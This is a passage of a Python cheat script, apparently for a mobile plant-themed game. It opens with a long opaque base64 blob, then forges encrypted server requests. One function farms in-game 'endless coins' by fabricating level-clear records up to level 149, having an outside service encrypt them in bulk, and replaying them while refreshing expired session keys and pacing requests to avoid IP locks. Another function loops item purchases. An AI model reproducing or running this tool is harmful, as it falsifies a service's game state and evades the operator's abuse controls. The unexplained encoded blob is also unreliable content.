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"
        data = {"req": "V303", "e": {"al": [{"id": 10622, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi_val, "sk": sk_val, "ui": ui_val, "v": 版本号}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, er_url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            _login_expired = True
        elif response_data.get("r") == 0:
            _login_expired = False
            # print("\033[38;5;46m文本正常\033[0m", end=" | ")  # 已隐藏
        else:
            print("\033[38;5;196m您已锁IP，请稍等几分钟再试\033[0m\n")

def _build_v322_one(lv, pi, sk, ui):
    """返回 V322 单关 dict（未 dumps），lv 是当前关 l"""
    return {
        "req": "V322",
        "e": {
            "acd": {"g": 3317, "ubn": 0, "uebn": 0, "upnl": [{"id": 111019, "n": 2}]},
            "fr": "1", "pi": pi, "sk": sk, "ui": ui,
            "ri": {
                "l": lv, "ml": 0, "lwml": 149,
                "lc": [1, 1, 1, 1, 1], "eb": 1, "eub": 0,
                "pl": "H4sIAAAAAAAAA31VYUvDMBT8Q_vQtVPxY1grZuyllGXM-U2HjqYOhSFp8-vtkgqCd_tWUnLv7r27l11xbl92TVs77aVUhQy-fW31rRTZ-W1fXzvl29b9Uh22Xq5-tbuM7xv+jt9-ujG72G8401ozvq0GDHM_frxF2-8Y1VmNghP9dLSOjmoczkP8NxW3pQHVN8be6S86iXklRuu_wbz6gral3IL6sc-94LqOzX-O_RMp7iK6oH9jHgyZ_zECcMrDOW3x4O4xtt2U52H_3WQP2KdLeddatbXnPdhi_hNc0L-jXgD9EnEU5SfcdCPUW_N9SJ_Jb2Bzj3AvEY8zflZPneh_A4Dm29dIn6xf3NDc955rhf1L-J5iJ9-SfeTBKQ34mUcTyO9Cc_SXA9wvlHvccFzSPs3XMkh3kdxT_B84H184SdUr-H8Mrgvk5-RXkz72imul-eX-s_weRR8z-7ROzPNt-N-pniC_DfxQ3qra7nOYQ6Tj1CuU52A5j7lmr13NO-K7qP6z7r61MxmP3cs_ItECAAA",
                "dm": "1224a334299aa9b2bf15c5cbfa7b11de",
                "ls": 2050, "ds": 0, "bn": 1, "bu": 0,
                "m": 25545, "jc": 0, "jl": 0,
                "par": 58, "pas": 500,
                "on": "53fc6d2faea34c2681abbcf018d344f7",
                "alt": 15, "amt": 15, "cil": []
            },
            "w": "4"
        },
        "ev": 3
    }

def run_thirtieth_ninth_script():
    import socket as _sk
    import threading
    from collections import deque
    global ek_val
    CACHE = deque(maxlen=50)

    pi, ui, sk = session.pi, session.ui, session.sk
    log_path = None
    def L(msg):
        print(msg)

    def _wait_cd(sec):
        t_end = time.time() + sec
        while time.time() < t_end:
            time.sleep(min(0.3, t_end - time.time()))

    L("===== 刷无尽币 =====")
    import sys as _sys
    _args = _sys.argv[1:] if hasattr(_sys,"argv") else []
    loops_in = None
    for a in _args:
        try:
            v = int(a)
            if 1 <= v <= 50: loops_in = v
        except: pass
    if loops_in is None:
        lt = input("循环次数(默认2): ").strip()
        try: loop_times = int(lt)
        except: loop_times = 2
    else:
        loop_times = loops_in
    pre_delay = 0.25
    nodelay = False
    L(f"开始刷无尽币，共{loop_times}轮")

    for loop_index in range(loop_times):
        start_time = time.time()
        L(f"第{loop_index+1}轮开始")

        data = {"req":"V303","e":{"al":[{"id":10622,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
        ed, hd = get_encrypted_data(data, url)
        resp = _do_post(hd, ed, data)
        pi, ui, sk = session.pi, session.ui, session.sk
        try:
            dec = get_decrypted_data(url, data=_fake_resp(resp.text))
            dj = json.loads(dec)
        except Exception as e:
            L(f"V303响应解析失败: {e}"); continue
        if dj.get("r") != 0:
            L(f"V303失败 r={dj.get('r')}，跳过本轮"); continue
        nsv = dj.get("ns")
        if nsv:
            ek_val = hashlib.md5((ek_val+str(nsv)).encode()).hexdigest(); session.ek = ek_val
        try:
            nst_t = datetime.strptime(dj["e"]["d"][0]["nst"],"%Y%m%d%H%M%S")
            net_t = datetime.strptime(dj["e"]["d"][0]["net"],"%Y%m%d%H%M%S")
            if not (nst_t <= datetime.now() <= net_t):
                L("不在活动时间范围"); break
        except Exception: pass
        L("活动已开始")

        data = {"req":"V303","e":{"al":[{"id":10622,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
        ed, hd = get_encrypted_data(data, url)
        _do_post(hd, ed, data)
        pi, ui, sk = session.pi, session.ui, session.sk

        data = {"req":"V222","e":{"p":{"of":0},"pi":pi,"rv":"5","sk":sk,"t":"12","ui":ui},"ev":3}
        ed, hd = get_encrypted_data(data, url)
        resp = _do_post(hd, ed, data)
        pi, ui, sk = session.pi, session.ui, session.sk
        value_of_l = "0"
        try:
            dec = get_decrypted_data(url, data=_fake_resp(resp.text))
            dj = json.loads(dec)
            value_of_l = json.loads(dj["e"]["d"]["j"]).get("l","0")
            if dj.get("r")==0:
                nsv = dj.get("ns")
                if nsv:
                    ek_val=hashlib.md5((ek_val+str(nsv)).encode()).hexdigest(); session.ek=ek_val
        except Exception as e:
            L(f"解析V222出错: {e}"); continue

        data = {"req":"V318","e":{"acd":{"g":0},"l":value_of_l,"pi":pi,"pl":[],"sk":sk,"ui":ui},"ev":3}
        ed, hd = get_encrypted_data(data, url)
        try:
            resp = _do_post(hd, ed, data)
            pi, ui, sk = session.pi, session.ui, session.sk
            dec = get_decrypted_data(url, data=_fake_resp(resp.text))
            djd = json.loads(dec)
            if djd.get("r")==0:
                nsv = djd.get("ns")
                if nsv:
                    ek_val=hashlib.md5((ek_val+str(nsv)).encode()).hexdigest(); session.ek=ek_val
        except Exception:
            pass
        i_value = int(value_of_l)

        if i_value >= 148:
            L(f"当前l={i_value}，重置无尽关卡")
            try:
                d_ = {"req":"V316","e":{"b":"0","n":"","pi":pi,"sk":sk,"ui":ui},"ev":3}
                ed_, hd_ = get_encrypted_data(d_, url)
                r_ = _do_post(hd_, ed_, d_)
                pi,ui,sk = session.pi,session.ui,session.sk
                try:
                    dec_ = get_decrypted_data(url, data=_fake_resp(r_.text)); dj_ = json.loads(dec_)
                    uk_ = int(dj_["e"]["d"]["p"]["uk"]) + 1
                    if dj_.get("r")==0:
                        nsv_=dj_.get("ns")
                        if nsv_:
                            ek_val=hashlib.md5((ek_val+str(nsv_)).encode()).hexdigest(); session.ek=ek_val
                except Exception: uk_ = 1
                d_ = {"req":"V209","e":{"oi":"10300","pi":pi,"q":"1","si":"1","sk":sk,"ui":ui,"uk":str(uk_)},"ev":3}
                ed_, hd_ = get_encrypted_data(d_, url)
                r_ = _do_post(hd_, ed_, d_); pi,ui,sk = session.pi,session.ui,session.sk

                d_ = {"req":"V222","e":{"p":{"of":0},"pi":pi,"rv":"5","sk":sk,"t":"12","ui":ui},"ev":3}
                ed_, hd_ = get_encrypted_data(d_, url)
                r_ = _do_post(hd_, ed_, d_); pi,ui,sk = session.pi,session.ui,session.sk
                dec_ = get_decrypted_data(url, data=_fake_resp(r_.text)); dj_ = json.loads(dec_)
                value_of_l = json.loads(dj_["e"]["d"]["j"]).get("l","0")
                i_value = int(value_of_l)
                if dj_.get("r")==0:
                    nsv_=dj_.get("ns")
                    if nsv_:
                        ek_val=hashlib.md5((ek_val+str(nsv_)).encode()).hexdigest(); session.ek=ek_val
                L(f"重置后起始关卡 Lv{i_value}")
            except Exception as e:
                L(f"重置失败: {e}"); continue
        if i_value >= 149:
            L("重置后仍在149关，跳过"); continue

        loop_count_new = 149 - i_value
        L(f"起始Lv{i_value}，批量加密{loop_count_new}关...")
        data_list = []
        for lv_off in range(loop_count_new):
            data_list.append(json.dumps(_build_v322_one(i_value + lv_off, pi, sk, ui)))
        data_to_send = json.dumps(data_list + [{"ek": ek_val}])
        try:
            encrypted_resp = requests.post(tx_url, data_to_send, timeout=20)
            enc_list = json.loads(encrypted_resp.text)
        except Exception as e:
            L(f"批量加密失败: {e}"); continue
        if not isinstance(enc_list, list) or len(enc_list) < 2:
            L(f"批量加密返回异常"); continue

        encrypted_data_value = enc_list[:-1]
        L(f"加密完成，共{len(encrypted_data_value)}关，开始发送")
        index = 0; send_count = 0
        http_session = requests.Session()
        if nodelay:
            from requests.adapters import HTTPAdapter
            try:
                from urllib3.connection import HTTPConnection as _UHC
                if not any(len(o)>=3 and o[1]==_sk.TCP_NODELAY and o[2]==1 for o in _UHC.default_socket_options):
                    _UHC.default_socket_options = list(_UHC.default_socket_options) + [(_sk.IPPROTO_TCP,_sk.TCP_NODELAY,1)]
            except Exception: pass
            http_session.mount("http://", HTTPAdapter(pool_connections=1,pool_maxsize=1))
        while index < len(encrypted_data_value):
            cur_lv = i_value + index + 1
            item = encrypted_data_value[index]
            # iOS平台添加无尽延迟，防止锁IP
            if pingtai == 'ios':
                time.sleep(无尽延迟)
            try:
                response = http_session.post(and_url, headers=item["headers"], data=item["body"], timeout=8)
                response_text = response.text
            except Exception as e:
                L(f"Lv{cur_lv} 请求异常: {str(e)[:60]}，等待15秒重试")
                _wait_cd(15); http_session = requests.Session(); continue
            lines = [ln.strip() for ln in response_text.split("\\n") if ln.strip()]
            json_line = None
            for ln in reversed(lines):
                if ln.startswith("{"):
                    json_line = ln; break
            try: response_data = json.loads(json_line) if json_line else None
            except Exception: response_data = None
            if response_data is None:
                L(f"Lv{cur_lv} 响应异常，重试"); _wait_cd(15); continue
            rv = response_data.get("r")
            if rv == 0:
                CACHE.append({"raw":json_line})
                L(f"第{cur_lv}关过关成功")
                if cur_lv < 65 and pre_delay > 0:
                    time.sleep(pre_delay)
                send_count += 1; index += 1; continue
            if rv in (20024, 20001):
                pre65 = cur_lv < 65
                L(f"Lv{cur_lv} ek过期，刷新重加密")
                done_ev = threading.Event(); box=[None]
                def _bg(slv=cur_lv):
                    nonlocal pi,ui,sk
                    global ek_val
                    if not session.refresh_ek():
                        done_ev.set(); return
                    pi,ui,sk = session.pi,session.ui,session.sk
                    new_ek = session.ek
                    rel=[]; lv=slv-1
                    while lv<149:
                        rel.append(json.dumps(_build_v322_one(lv,pi,sk,ui)))
                        lv+=1
                    rd=json.dumps(rel+[{"ek":new_ek}])
                    try:
                        rr=requests.post(tx_url,rd,timeout=20); nl=json.loads(rr.text)
                        box[0]=(nl,new_ek)
                    except Exception: pass
                    done_ev.set()
                threading.Thread(target=_bg,daemon=True).start()
                if pre65:
                    done_ev.wait(timeout=20)
                else:
                    _wait_cd(15); done_ev.wait(timeout=10)
                if box[0] is not None:
                    new_enc,new_ek = box[0]
                    ek_val = new_ek
                    encrypted_data_value = encrypted_data_value[:index] + new_enc[:-1]
                    http_session = requests.Session()
                    if nodelay:
                        from requests.adapters import HTTPAdapter
                        http_session.mount("http://", HTTPAdapter(pool_connections=1,pool_maxsize=1))
                    L(f"Lv{cur_lv} 重加密完成，继续")
                else:
                    L("  ★ 刷新/重加密失败，重建session重试")
                    http_session = requests.Session()
                    if nodelay:
                        from requests.adapters import HTTPAdapter
                        http_session.mount("http://", HTTPAdapter(pool_connections=1,pool_maxsize=1))
                continue
            L(f"第{cur_lv}关失败，重试")
            _wait_cd(15)
            http_session = requests.Session()
            if nodelay:
                from requests.adapters import HTTPAdapter
                http_session.mount("http://", HTTPAdapter(pool_connections=1,pool_maxsize=1))
        L(f"第{loop_index+1}轮完成，耗时{time.time()-start_time:.1f}秒")

        if loop_index != loop_times - 1:
            L("重置无尽关卡...")
            try:
                data = {"req":"V316","e":{"b":"0","n":"","pi":pi,"sk":sk,"ui":ui},"ev":3}
                ed, hd = get_encrypted_data(data, url)
                resp = _do_post(hd, ed, data)
                pi,ui,sk = session.pi,session.ui,session.sk
                try:
                    dec = get_decrypted_data(url, data=_fake_resp(resp.text)); dj = json.loads(dec)
                    if dj.get("r")==0:
                        nsv = dj.get("ns")
                        if nsv:
                            ek_val=hashlib.md5((ek_val+str(nsv)).encode()).hexdigest(); session.ek=ek_val
                    uk = int(dj["e"]["d"]["p"]["uk"]) + 1
                except Exception: uk = 1
                data = {"req":"V209","e":{"oi":"10300","pi":pi,"q":"1","si":"1","sk":sk,"ui":ui,"uk":str(uk)},"ev":3}
                ed, hd = get_encrypted_data(data, url)
                resp = _do_post(hd, ed, data)
                pi,ui,sk = session.pi,session.ui,session.sk
                try:
                    rd = json.loads(resp.text)
                    if rd.get("r")==20013: L("请求文本已过期")
                    elif rd.get("r")==0: L("无尽重置成功")
                    else: L(f"重置失败 r={rd.get('r')}")
                except Exception as e:
                    L(f"重置响应异常: {e}")
            except Exception as e:
                L(f"重置失败: {e}")
        L(f"本轮总耗时: {time.time()-start_time:.1f}秒")
    print(f"全部{loop_times}轮完成")

def run_fortieth_script():
    pi, ui, sk = get_pi_sk(加密)
    product_codes = {"1": 23007,"2": 23008,"3": 23009,"4": 23010,"5": 23011,"6": 22000280,"7": 22000250,"8": 111120,"9": 111176,"10": 1181,"11": 1162,"12": 111104,"13": 1136,"14": 1116,"15": 22000690,"16": 22000480,"17": 1172,"18": 1123,"19": 1186,"20": 111136,"21": 1121,"22": 22000590,"23": 22000320,"24": 111169,"25": 111154,"26": 1144,"27": 1133,"28": 1101,"29": 22000310,"30": 1161,"31": 111111,"32": 111112,"33": 22000260,"34": 111172,"35": 111134,"36": 111139,"37": 1114,"38": 1140,"39": 22000290,"40": 1159,"41": 1105,"42": 22000410,"43": 111124,"44": 111144,"45": 22000080,"46": 1171,"47": 1143,"48": 111152,"49": 111142,"50": 1167,"51": 111162,"52": 111146,"53": 22000540, "54": 41110461, "55": 22000800}
    buy_value = []

    name_map = {}
    for num, code in product_codes.items():
        if str(code) in formatted_plant:
            name_map[code] = formatted_plant[str(code)]["name"]
        else:
            name_map[code] = f"未知({code})"

    quality_colors = {"baise": "\033[37m", "lvse": "\033[32m", "lanse": "\033[34m", "zise": "\033[35m", "chengse": "\033[38;5;214m", "default": "\033[37m"}
    reset = "\033[0m"
    menu_items = sorted(product_codes.items(), key=lambda x: int(x[0]))
    for mi in range(0, len(menu_items), 2):
        line_parts = []
        for mj in range(2):
            if mi + mj < len(menu_items):
                mnum, mcode = menu_items[mi + mj]
                mname = name_map.get(mcode, str(mcode))
                mquality = formatted_plant.get(str(mcode), {}).get("pinzhi", "default")
                mcolor = quality_colors.get(mquality, "\033[37m")
                num_str = f"{mnum:>2}. "
                item_display = num_str + mname
                display_len = sum(2 if ord(c) > 127 else 1 for c in item_display)
                padding = " " * max(0, 22 - display_len)
                line_parts.append(f"{mcolor}{item_display}{reset}{padding}")
        print("    " + "".join(line_parts))

    user_input = input("请输入需要循环的序号，空格分隔，输入q退出，回车确认：").strip()
    for num in user_input.split():
        if num in product_codes:
            code = product_codes[num]
            if code not in buy_value:
                buy_value.append(code)
